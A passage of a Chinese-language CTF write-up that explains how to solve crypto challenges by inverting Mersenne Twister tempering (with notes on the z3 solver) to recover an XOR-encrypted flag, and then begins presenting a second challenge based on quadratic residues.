class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(s)):<br>    c += <span class="hljs-built_in">str</span>(<span class="hljs-built_in">int</span>(s[i]) ^ <span class="hljs-built_in">int</span>(rand[i]))<br><span class="hljs-built_in">print</span>(c)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">change</span>(<span class="hljs-params">number</span>):</span><br>    number = number ^ (number &gt;&gt; <span class="hljs-number">11</span>)<br>    number = number ^ ((number &lt;&lt; <span class="hljs-number">7</span>) &amp; <span class="hljs-number">2636928640</span>)<br>    number = number ^ ((number &lt;&lt; <span class="hljs-number">15</span>) &amp; <span class="hljs-number">4022730752</span>)<br>    number = number ^ (number &gt;&gt; <span class="hljs-number">18</span>)<br><br>    <span class="hljs-keyword">return</span> number &amp; <span class="hljs-number">0xffffffff</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(Rand)):<br>    Rand[i] = change(Rand[i])<br><span class="hljs-built_in">print</span>(Rand)<br><br><span class="hljs-comment"># Rand = [389902299, 3515959351, 2216779731, 2601284435, 514154742, 4172047173, 2921107804, 2217826537, 4248207905, 1322376767]</span><br><br><span class="hljs-comment"># c = 01101100010001011100100011111110110000101111000001100001110010001100111000110010111101011111100101011100111011110100001010100111100000010101100011001000011111110111111001010000010000111000101000011111011101001011110001010100100011001010001001111110011111100101111010000010101011100010001111011001010010001010001110001111</span><br></code></pre></td></tr></table></figure><h4 id="分析：-4"><strong>分析</strong>：</h4><h5 id="1）在求解时走了很多弯路，但还是附上笔记："><strong>1）在求解时走了很多弯路，但还是附上笔记：</strong></h5><p>根据队友的指导，在Pychome中下载了Z3包，帮助我求解异或位移方程。z3是一种有效的解方程工具。</p><h6 id="学习z3库"><strong>学习z3库</strong></h6><p>在Python中使用Z3模块，我们的所求结果<strong>一般有以下几种数据类型:</strong></p><blockquote><p>Int   #整型<br>Bool       #布尔型<br>Array      #数组<br>BitVec ( ‘a’，8 )  #char型</p></blockquote><p>其中BitVec可以是特定大小的数据类型，不一定是8，例如C语言中的int型可以用BitVec(‘a’,32)表示</p><p><strong>设未知数的方法</strong> ：</p><p><strong>可以使用 ‘Int’ , ‘Real’ , ‘BitVec’ 等声明一个整数或实数变量，也可以申明一个变量数组</strong></p><p><strong>例如</strong>：x = Int(‘x’) #这个int不是c/c++中的那个，而仅仅只代表整数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">y =Real(<span class="hljs-string">&#x27;y&#x27;</span>)  <span class="hljs-comment">#实数变量(数学中的那个实数)</span><br>z =BitVec(<span class="hljs-string">&#x27;z&#x27;</span>,<span class="hljs-number">8</span>) <span class="hljs-comment">#char型</span><br>w =BitVec(<span class="hljs-string">&#x27;w&#x27;</span>,<span class="hljs-number">32</span>) <span class="hljs-comment">#int型</span><br>p =Bool(<span class="hljs-string">&#x27;p&#x27;</span>)    <span class="hljs-comment">#定义布尔型</span><br></code></pre></td></tr></table></figure><p><strong>初始化序列：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python">flag = []<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>):<br>    flag.append(BitVec(<span class="hljs-string">&#x27;%d&#x27;</span> % i, <span class="hljs-number">8</span>))    <span class="hljs-comment">#char型</span><br><span class="hljs-built_in">print</span>(flag)<br> <br><span class="hljs-comment">#结果为:[0, 1, 2, 3, 4]</span><br> <br>flag= [Int(<span class="hljs-string">&#x27;%d&#x27;</span> % i) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>)]    <span class="hljs-comment">#初始化为int型</span><br> <br>flag = []<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>):<br>    flag.append(BitVec(<span class="hljs-string">&#x27;%d&#x27;</span> % i, <span class="hljs-number">32</span>))    <span class="hljs-comment">#int型</span><br><span class="hljs-built_in">print</span>(flag)<br> <br><span class="hljs-comment">#结果为:[0, 1, 2, 3, 4]</span><br></code></pre></td></tr></table></figure><h6 id="基本使用语法"><strong>基本使用语法</strong></h6><p><strong>Solver()</strong></p><p>Solver()命令会创建一个通用求解器，创建后我们可以添加我们的约束条件，进行下一步的求解</p><p><strong>add()</strong></p><p>add()命令用来添加约束条件，通常在solver()命令之后，添加的约束条件通常是一个逻辑等式</p><p><strong>check()</strong></p><p>该函数通常用来判断在添加完约束条件后，来检测解的情况，有解的时候会回显sat，无解的时候会回显unsat</p><p><strong>model()</strong></p><p>在存在解的时候，该函数会将每个限制条件所对应的解集的交集，进而得出正解。</p><p><strong>常用求解步骤：</strong></p><p>创建约束求解器</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">solver = Solver()<br></code></pre></td></tr></table></figure><p>添加约束条件（这一步是z3求解的关键）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">solver.add()<br></code></pre></td></tr></table></figure><p>判断解是否存在</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">if</span> solver.check() == sat:<span class="hljs-comment"># sat 表示有解 unsat 表示无解</span><br></code></pre></td></tr></table></figure><p>求解</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">print</span> ( solver.model() )<span class="hljs-comment">#一般是以 &#x27;约束求解器&#x27;.model() 得到结果，配合 print输出</span><br></code></pre></td></tr></table></figure><h6 id="加密过程的实质只有两步："><strong>加密过程的实质只有两步：</strong></h6><p>1）产生随机二进制字符串rand。具体做法是：</p><p><strong>1.获得l。</strong></p><p>将flag字符串转换成long。这里插一个python中byte 与 int 的转换(示例)：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">b = <span class="hljs-string">b&#x27;SYC&#x27;</span><br><span class="hljs-built_in">int</span>.from_bytes(b,byteorder=<span class="hljs-string">&#x27;big&#x27;</span>)<br><span class="hljs-number">5462339</span><br>x=<span class="hljs-number">5462339</span><br>x.to_bytes(<span class="hljs-number">3</span>,byteorder=<span class="hljs-string">&#x27;big&#x27;</span>,signed=<span class="hljs-literal">False</span>)<br><span class="hljs-string">b&#x27;SYC&#x27;</span><br></code></pre></td></tr></table></figure><p>再由十进制转二进制，计算二进制数的长度，把他赋给l。</p><p>然后进行选择操作：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">if</span>(l%<span class="hljs-number">32</span> == <span class="hljs-number">0</span>)&#123;<br><br>l =l // <span class="hljs-number">32</span> <span class="hljs-comment">#//=:整除</span><br><br>&#125;<span class="hljs-keyword">else</span>&#123;<br><br>l = l // <span class="hljs-number">32</span> +<span class="hljs-number">1</span><br><br>&#125;<br></code></pre></td></tr></table></figure><p>从后面可以看到，l = 10。</p><p>2.产生rand字符串。</p><p>for循环重复l次操作：</p><p>产生32位（也就是整型，&lt;=2^32-1）的随机数pro，把它添加到Rand数组中。然后，把pro转换为二进制字符串，对其进行zfill(32)操作：</p><p>原字符串右对齐，前面填充0，得到32位长度的字符串。</p><p>添加到空字符串rand后面。</p><p>所以，最后得到的Rand数组有10个元素，而rand字符串就是长度为10*32=320的二进制字符串。</p><p><strong>2）加密。具体做法是：</strong></p><p>**1.对Rand数组中的每个元素进行change函数的变换。**变换过程是：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">change</span>(<span class="hljs-params">number</span>):</span><br>    number = number ^ (number &gt;&gt; <span class="hljs-number">11</span>)<br>    number = number ^ ((number &lt;&lt; <span class="hljs-number">7</span>) &amp; <span class="hljs-number">2636928640</span>)<br>    number = number ^ ((number &lt;&lt; <span class="hljs-number">15</span>) &amp; <span class="hljs-number">4022730752</span>)<br>    number = number ^ (number &gt;&gt; <span class="hljs-number">18</span>)<br><br>    <span class="hljs-keyword">return</span> number &amp; <span class="hljs-number">0xffffffff</span><br></code></pre></td></tr></table></figure><p>最终得到的就是题目下方的Rand数组，以及其中的10个数。这个数组对解题非常关键！</p><p>**2.加密。**将flag字符串转换成long,再由十进制转二进制。进行zfill操作（还记得是怎么做的吗？）得到和rand的长度相等（=320）的二进制字符串s。这样，含有flag的字符串s就和含有随机数的字符串rand长度相等了。</p><p>对字符串中相同位置(s[i],rand[i])的二进制数字进行异或^运算，所得到的二进制数字添加到空字符串c的后面，所得到的c就是密文了。</p><img src="https://static01.imgkr.com/temp/5fd45478b4aa44639f331768c91a83ff.png" style="zoom:25%;" /><h6 id="这张图是上面文字的流程图版，结合起来就能理解它的加密原理了。"><strong>这张图是上面文字的流程图版，结合起来就能理解它的加密原理了。</strong></h6><p>现在手头有的条件有三个：加密原理、含有随机数（密钥）的数组Rand、密文c</p><p>理解了加密原理,解密的思路就很清晰了：</p><p>1）既然知道Rand中的随机数变换法则和最终结果，那就可以通过解方程来反求随机数pro。将pro转换为二进制，zfill操作后依次连接起来，就可以得到二进制字符串rand。又根据异或的特殊性质：</p><h6 id="a-b-b-a"><strong>a^b^b = a</strong></h6><p>c是由rand和s异或得到的，那么再把c和rand异或就能得到s。有了s，自然就有flag了。</p><h6 id="遇到问题"><strong>遇到问题</strong></h6><p>我编写了求解pro的方程：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> z3 <span class="hljs-keyword">import</span> *<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">change</span>(<span class="hljs-params">number</span>):</span> <span class="hljs-comment">#这里和加密过程一样</span><br>    number = number ^ (number &gt;&gt; <span class="hljs-number">11</span>)<br>    number = number ^ ((number &lt;&lt; <span class="hljs-number">7</span>) &amp; <span class="hljs-number">2636928640</span>)<br>    number = number ^ ((number &lt;&lt; <span class="hljs-number">15</span>) &amp; <span class="hljs-number">4022730752</span>)<br>    number = number ^ (number &gt;&gt; <span class="hljs-number">18</span>)<br><br>    <span class="hljs-keyword">return</span> number &amp; <span class="hljs-number">0xffffffff</span><br>number = BitVec(<span class="hljs-string">&#x27;number&#x27;</span>,<span class="hljs-number">32</span>)<br>solver = Solver()<br>solver.add(change(number) == <span class="hljs-number">389902299</span>) <span class="hljs-comment">#这里列方程</span><br><span class="hljs-keyword">if</span> solver.check() == sat: <span class="hljs-comment">#判断是否有解</span><br>    <span class="hljs-built_in">print</span>(solver.model())<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;WA&#x27;</span>)<br></code></pre></td></tr></table></figure><p>代入第一个数据389902299，成功得到第一个pro:[number = 587391287]</p><p>但代入第二个、第三个……最后一个数据，全都无解！</p><h5 id="2）正确的解法"><strong>2）正确的解法</strong></h5><p>**引例：**shift = 3，length = 8</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python">number = <span class="hljs-string">&#x27;11010010&#x27;</span><br>value = <span class="hljs-built_in">int</span>(number,<span class="hljs-number">2</span>)<br>shifted = value&gt;&gt;<span class="hljs-number">3</span><br>result = value^shifted<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;value:&quot;</span>+<span class="hljs-built_in">bin</span>(value))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;shifted:&quot;</span>+<span class="hljs-built_in">bin</span>(shifted))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;result:&quot;</span>+<span class="hljs-built_in">bin</span>(result))<br><br>value:  <span class="hljs-number">0b11010010</span><br>shifted:<span class="hljs-number">0b00011010</span><br>result: <span class="hljs-number">0b11001000</span><br></code></pre></td></tr></table></figure><p>观察结果，不难发现，result的前shift位和value的前shift位是相同的。这是因为异或时shifted的前shift位全部是0。因此我们能得到mask满足前shift位和value相同，后面全为0</p><p>该怎么得到这个数呢？根据逻辑运算符的法则，当result与一个前shift位为1，后面全为0的数做&amp;按位与运算（这个数记作p），就能得到mask(前提是二者长度相等)。其中p是由0xffffffff&lt;&lt;(length-shift)来的</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">result = <span class="hljs-built_in">int</span>(<span class="hljs-string">&#x27;11001000&#x27;</span>,<span class="hljs-number">2</span>)<br>p = <span class="hljs-built_in">int</span>(<span class="hljs-string">&#x27;11100000&#x27;</span>,<span class="hljs-number">2</span>)<br>mask = result&amp;p<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">bin</span>(mask))<br><br><span class="hljs-number">0b11000000</span><br></code></pre></td></tr></table></figure><p>有了value的前shift位数mask，根据移位规则，就能得到shifted的前2 * shift位(记作mask2)，又由异或规则,value的前2*shift位value1就等于</p><p>value1 = mask2^result</p><p>重复循环知道n次shift的值&gt;=length,此时得到的数就是原来的值value了！</p><h4 id="这张图是上面文字的形象表示，结合起来就能理解解密过程了"><strong>这张图是上面文字的形象表示，结合起来就能理解解密过程了</strong></h4><img src="https://static01.imgkr.com/temp/9c0a684f77ed4a1387fd36b09cb71c3a.png" style="zoom: 25%;" /><p>根据相同的道理，可以推导出左移时候的情况。结合在一起，就能编写出最终的解密代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">inverse_right_shift_xor</span>(<span class="hljs-params">value, shift</span>):</span> <span class="hljs-comment">#右移逆向</span><br>    i, result = <span class="hljs-number">0</span>, <span class="hljs-number">0</span><br>    <span class="hljs-keyword">while</span> i * shift &lt; <span class="hljs-number">32</span>:<br>        part_mask = (<span class="hljs-number">0xffffffff</span> &lt;&lt; (<span class="hljs-number">32</span> - shift)) &gt;&gt; (i * shift)<br>        part = value &amp; part_mask<br>        value ^= part &gt;&gt; shift<br>        result ^= part<br>        i += <span class="hljs-number">1</span><br>    <span class="hljs-keyword">return</span> result<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">left</span>(<span class="hljs-params">value, shift, mask</span>):</span> <span class="hljs-comment">#左移逆向</span><br>        i, result = <span class="hljs-number">0</span>, <span class="hljs-number">0</span><br>        <span class="hljs-keyword">while</span> i * shift &lt; <span class="hljs-number">32</span>:<br>            part_mask = (<span class="hljs-number">0xffffffff</span>&gt;&gt; (<span class="hljs-number">32</span> - shift)) &lt;&lt; (i * shift)<br>            part = value &amp; part_mask<br>            value ^= (part &lt;&lt; shift) &amp; mask<br>            result ^= part<br>            i += <span class="hljs-number">1</span><br>        <span class="hljs-keyword">return</span> result<br>Rand = [<span class="hljs-number">389902299</span>, <span class="hljs-number">3515959351</span>, <span class="hljs-number">2216779731</span>, <span class="hljs-number">2601284435</span>, <span class="hljs-number">514154742</span>, <span class="hljs-number">4172047173</span>, <span class="hljs-number">2921107804</span>, <span class="hljs-number">2217826537</span>, <span class="hljs-number">4248207905</span>, <span class="hljs-number">1322376767</span>]<br>rand=<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(Rand)) : <span class="hljs-comment">#求解pro,并得到rand</span><br>    a = Rand[i]<br>    b = inverse_right_shift_xor(a, <span class="hljs-number">18</span>)<br>    c = left(b, <span class="hljs-number">15</span>, <span class="hljs-number">4022730752</span>)<br>    d = left(c, <span class="hljs-number">7</span>, <span class="hljs-number">2636928640</span>)<br>    e = inverse_right_shift_xor(d, <span class="hljs-number">11</span>)<br>    rand += <span class="hljs-built_in">bin</span>(e)[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">32</span>)<br>c = <span class="hljs-string">&#x27;01101100010001011100100011111110110000101111000001100001110010001100111000110010111101011111100101011100111011110100001010100111100000010101100011001000011111110111111001010000010000111000101000011111011101001011110001010100100011001010001001111110011111100101111010000010101011100010001111011001010010001010001110001111&#x27;</span><br>s = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(rand)): <span class="hljs-comment">#异或是可逆的，得到s</span><br>    s += <span class="hljs-built_in">str</span>(<span class="hljs-built_in">int</span>(c[i]) ^ <span class="hljs-built_in">int</span>(rand[i]))<br>s = <span class="hljs-string">&#x27;1010011010110010100001101111011001100010111001100101101011100100110000101101110011001000011000001101101001011010110111101110010001011010110111001101111011101000010110101010100011010000110000101110100001011010110100100110101001011010110000100101101011100010111010100110011011100110111010001101001011011110110111001111101&#x27;</span><br>x = <span class="hljs-built_in">int</span>(s,<span class="hljs-number">2</span>)<br><span class="hljs-built_in">print</span>(x)<br><br><span class="hljs-number">695436377387756659207326273798451770608388670144120223799296234200392681042739248103523814960765</span><br></code></pre></td></tr></table></figure><p>最终得到的x用long_to_bytes，得到SYC{1s-rand0m-or-not-That-i5-a-qu3stion}</p><p>松本眞、西村拓士，我是你们的破壁人！！！</p><h3 id="step-by-step"><strong>step by step</strong></h3><h4 id="附件：-5"><strong>附件：</strong></h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> getPrime, bytes_to_long, long_to_bytes<br><span class="hljs-keyword">import</span> gmpy2 <span class="hljs-keyword">as</span> gp<br><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">from</span> flag <span class="hljs-keyword">import</span> flag<br>flag = bytes_to_long(flag)<br>p = getPrime(<span class="hljs-number">100</span>)<br>q = getPrime(<span class="hljs-number">100</span>)<br>n = p * q<br>clist = []<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">bin</span>(flag)[<span class="hljs-number">2</span>:]:<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        x = random.randint(<span class="hljs-number">1</span>, n)<br>        <span class="hljs-keyword">if</span> gp.gcd(x, n) == <span class="hljs-number">1</span>:<br>            c = (<span class="hljs-built_in">pow</span>(<span class="hljs-number">3</span>, <span class="hljs-built_in">int</span>(i) + x * <span class="hljs-number">2</span>, n) * x**<span class="hljs-number">2</span>) % n<br>            clist.append(c)<br>            <span class="hljs-keyword">break</span><br><span class="hljs-built_in">print</span>(n)<br><br><span class="hljs-built_in">print</span>(clist)<br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">1254676922968308054473282588201432441748387886551758353389559</span><br><span class="hljs-string">[112490766735794793494258589897687977797993914062877995369853, 423825989606899409733986824741778284626898537704684650054048, 1239912440099782777043012567198356769914426423982980091061342, 1078272043845620437375344423460688188703277391763226546180151, 159286594418951337823608883690981934876156746053051292254402, 189434397083734065502133592439774066008070864031834709620441, 264105932521685455831442874483122006851812174082486446496525, 252479590298382195780257510632414277760400686563367629394825, 34602153293813328946647556336715300088648653636913843351330, 808692976248223555967993480457680585654329233137701900525232, 836623390705731389723338030121423143060093415003999783847569, 1218829648463542488706300570862499177531816513847669694517865, 571795296699927140597629733281737316938588378300113684751321, 324408602401500017634991400429058861929441907523133040616718, 652309276856121062936275131393396513436481452168222192943617, 135368324264829776566203256490111602190045577103623626459391, 677807894471260530035795635544578014296111908610448488780236, 1135708831589387209825610411788217272141435421502826225558333, 196882176169680492388044653063809988445336200851553236565493, 1130705847039352086713022625138307016610235729598245321418537, 974627899979016730650505688458957247745733629797568884460037, 948987355716018600108888773982169186615279073844787201014331, 364200727831752453880724784142441918092136276002472196567297, 811786724825671349602848333002825903390189436235744947667153, 248544601758659627780643527412918707686666534454807514221527, 1078860601713092925823762998344218082511712606733279204236487, 634851505432770176888905188832078431577879067601938324607512, 232972021265122845242665536151391828176473610240017058444456, 1080796896535347345799923528377657622102130648424673730618155, 622059452832122796944248249707923610120342427983134655552340, 837257289852652447556360719449396492271622453092839975184158, 626327369687614106133688347844033161113612134573404258486630, 1233019194503373412608053469954621323121044455057773900406773, 912564467902216938034173803480737819092198560216579817988291, 408076399689155479697691914877522087726703540593136498587215, 1118745562641959211267518507476218888452509349041078337285098, 1103228775032586830415033772993541541820163005491285279882940, 680899077364553221002722115625274809744677788062477442312086, 355349436487753936000721704075588637048102593449252106813298, 5254361838244723184679801326407268664182654715017847086461, 480145671282471097574354032682584083826945502763658946101104, 249136810947175342894562520096603076879372702701088690594445, 175216547555975039599856545426098941943382367602172941744494, 436310864447848960706296122266108102033486860525693191197797, 342620466614509535208918527767209905005823047382938223113086, 369848992268737575958936185907214270590887322936419642815242, 278575045025661827978388874494219837629182438978526195181637, 1189171180780533071473125545247289861677955100195126109964590, 256190182678715266654387215899616014762531664768736561586327, 719160215933023695898776016718481385742508618676368640641809, 147033122794177086112261858085593706727904275426698884436011, 247466503394960387825735598976068779045757078494832316444804, 787155643450160361724955357286670519256662665704845721250609, 112101120505278148126370035869523081506090979629681063614381, 890009544685851814191758439205974159586245412054287515881584, 1168625756997945588141764967298286550498540363325170551587334, 946031342434770434479581499217378781992921204179509449159996, 759124753621557368233069144948668001126536400499520990700641, 930584421635842804698880452391670787414151645249729141739148, 140981825203074314092967178062754008486703246602401550271041, 880126454149733441805446179826584472107299085899567279467558, 510129631452465708304688340114214360026947205003705062663759, 857274757020001316639221394675820731579775247610619594760511, 444486969413575687285961819261097401974268741167841964919716, 645830958128126799221416466698967430939726760487764050203821, 128864469762235652994228226148325614187747349331618451490354, 732913002124581119538173953534485652651112140400076340646452, 1245672039639609341331477592944058028011275464117654972595670, 1160765030758624190775369713232721901616189349905945190302338, 745734132091942990384796294800038299023052878196943617322617, 34973161572808799782240527358912894045293050940490682156733, 507586651070816931641904112686082840821460472219390068396982, 359195216122538975934588740641220005777478961423841727365432, 60506687352654743312206686911057762445232526009857863834444, 402036521271253699065227780662896890228371046068283711170220, 465427226677337673103293964961886503610313835775181975449721, 925246962888172144515172444374190859841851825972285013006527, 542176614893876361668218387162168517498644799220587472896002, 852215132196560596695876248813488364201491362280912035912061, 945548964927065532651141821562204387565145712002346337639711, 736943822066388892909878515650831955490636214039062998720510, 766357526983761241394182000478355475617711906398422036954152, 77156525593382594092608158744099524034892127423492520631820, 562562817542804973601572838378263130638457829485887327130286, 768093992370198202822524520006977816845162154854939167515517, 1099957424762490943973557935337350760135180754563993547358098, 698816668614997174913438496891169625976027534942525487303513, 417641699919584202170293946436276552973997395211792288687960, 1006229610175567855209117721408416419896921240126676949824724, 4206431689326446028142220658552064336105749936096602165359, 893846509909828693967573302731018066461118006150050253703744, 878425189026235350891203121924637130803808920422558040493294, 730047416245095988472212050949689633327186823542036387345181, 648095719945750715387983948406690533087473721929975873848169, 213513454359755001454814601053555627585345770061082141021326, 350001050012957205656929492039628823072469208940960439158263, 1016858635000037892730835311903706149371704230428070443107320, 1040987439471207869975679257301693610464700899302787643642354, 1194690615352550474729309715449838057220521596135246725909553, 508165053077110820797186371383859674371399129952105597675096, 266494438294281492504556232035584920066331725618646155019547, 28469482072427012244441092412738741355431846649166066368980, 790175775999108776289865518368056397969387298334297622465909, 590581138260907253939363764832940322585129285968275409510634, 221909012579985462013325803334419731308959816500415305934495, 1063780559219791515938747204569742799329237935871594345400252, 977747525495509380693721486866821791065499754056415279744653, 346306061371595730004513789139807509540063462412619321003626, 456103179467597859705969406860196938169100856240100927540401, 969300078509189631808517876996065933181606409375207150288464, 1029806631220370012120597683927351131622576733031694535189521, 344896431603140401163996810922500893279239069499717183710501, 430000423804197030568046280589772094106128395099434235915031, 700179843567016021775399107572964843751703290591400960796112, 961227906080189143689698720420426659986080298413605666115640, 607209606799750473714271393200060455739097869884727178692312, 106958847163040842225140399905505511449479709017540851084532, 953369942103273809257762268859167463617831445026988544378658, 428269440686506672744282327102546440435442014650795927162711, 56621803434665963032193024056111306570802155743250152849716, 800707635631355839166448276143596444307614901816577459076131, 1032256515703247765067950588859299047987257001987777631061065, 813725055801254665600156259482200403981770576173968929131487, 940024839745068011043019236327963504645352520797347949823455, 1065005324140908547287467504568283884363143527586278243210801, 1087828777506290663525994551834233065465427418753806182842291, 668387132001968449612224853010931354244797738682007519611989, 563185246196177998134932666270526715161378776103340983046580, 148292872313931508344196679476720973752571125303712466045656, 413889563851226543249984374872220761253120628252088546262699, 853542105910386365929770611480736086723126396438880650918917, 59730458840715910492468261806200793684923819793480597554146, 792260492800286127199649276659137441324248689470594987965190, 753608630500639136668081531883097047491651258191552267413126, 33514911499472634865669915075769163328171019557849259474018, 634963859228206842307837566519244534650818456901841184879977, 219354096455968590219445072777282329948785844491217770978344, 1123377226439583158729762969668999276741275445803396272436031, 357765295513680388973981712560200525235334734759663454993805, 385868499980630535766019957877752149506518574529845752144666, 138578212294299392480319417966870656714476525885983752756188, 1110526796192425688386237355263892073046060477008920073455044, 244699783645221387947312903861559688207612147588246639081699, 583209905862562678600202085212425597809036630416117298854978, 1207854793808762194414317661151529169444903662139065050090746, 1127506983223466275821900811940356395242309493951089427884032, 526185119576631048584313761548704536031634598332129570964689, 266882032196696984660521486449809902101615921156569537960109, 1188118705564450461919200724390473040524626320052324478509883, 682831747455078454647149830819696088960233603851250102828667, 669419928942561433130809268138650695825596612075801278942980, 1077750630919867687880983437504767304166615787212813240073843, 486023540111308483450127320955599047045479654684477043315645, 409429366346146233850088863324915025465847596238000661872172, 779883595226131237594759409249289551033410304517183865388408, 1155872225708857920911178110668279174877878422508206228579940, 411063490066038942009369947241345843238439795078686488373864, 1243453053541946030699872676712518536022061850799945414120045, 871711034820169700581685353768658469631429266493677466057997, 601920686459160120670719526703980120744719013393032353678765, 329932100141177850249406090412821976994089707958551194468769, 558327299751202100333335353826111016492585371503632197870640, 113444032302978611299580451314055133491399096282744687816086, 152525914892717139057165748051966776217223953242540511499945, 965404850400527912039904270871065001313018148780552532312669, 313557099445185696402013375071955475516203519824979749629786, 952254159335810337756614972813240144837526566801182319987154]</span><br><span class="hljs-string"></span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br><br></code></pre></td></tr></table></figure><h4 id="分析：-5"><strong>分析：</strong></h4><h5 id="1）提示分析："><strong>1）提示分析：</strong></h5><p>题目中提供了提示连接。在链接文章中，作者给出了二次同余方程的解法，来解决两种方程：<br>$$<br>x^2≡n(mod 